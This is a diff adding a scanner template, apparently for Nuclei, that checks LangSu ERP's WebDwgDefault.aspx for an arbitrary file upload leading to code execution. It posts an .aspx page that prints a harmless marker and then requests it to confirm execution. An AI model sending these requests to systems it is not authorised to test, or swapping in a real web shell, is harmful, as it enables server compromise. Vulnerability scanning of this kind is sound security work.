@@ -1,0 +1,40 @@
+id: LangSuERP-WebDwgDefault_aspx-UploadToRce
+
+info:
+  name: LangSuERP-WebDwgDefault-UploadToRce
+  author: HuanXiong
+  severity: critical
+  description: LangSuERP-WebDwgDefault-UploadToRce
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /WebDwgDefault.aspx?IsSave=true&FileName={{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6cF2ujf5U1u9055I
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundary6cF2ujf5U1u9055I
+        Content-Disposition: form-data; name="file"; filename="1.aspx"
+        Content-Type: image/jpeg
+
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <% Response.Write("helloWorld")%>
+        ------WebKitFormBoundary6cF2ujf5U1u9055I--
+      - |
+        GET /{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        name: UploadToRce
+        dsl:
+          - "status_code == 200 && contains (body,'helloWorld')"
